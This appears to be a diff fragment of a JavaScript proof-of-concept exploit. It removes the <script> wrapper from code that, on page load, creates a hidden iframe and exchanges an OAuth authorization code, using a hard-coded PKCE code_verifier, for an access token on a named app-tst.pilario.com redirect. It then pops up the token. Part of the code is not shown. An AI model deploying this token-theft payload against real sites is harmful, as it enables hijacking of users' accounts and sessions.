@@ -1,4 +1,4 @@
-<script>
+
 window.addEventListener("DOMContentLoaded", ()=>{
 let iframe=document.createElement("iframe");
 iframe.style.display="none";
@@ -14,4 +14,4 @@ alert(token.access_token)
 }}
 xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 xhr.send(`code=${code}&grant_type=authorization_code&client_id=app-client&redirect_uri=https%3A%2F%2Fapp-tst.pilario.com%2Fscenarios&code_verifier=ps578XC8H3MW6cRiCveRJAWsP7JJ6QpSrrhsErOnwm5dE57vomHqXnk40ZhAasiLn1r8iALvlUapnrZYDRNUAuSLH2B44Fgj`)
-})})</script>
+})})
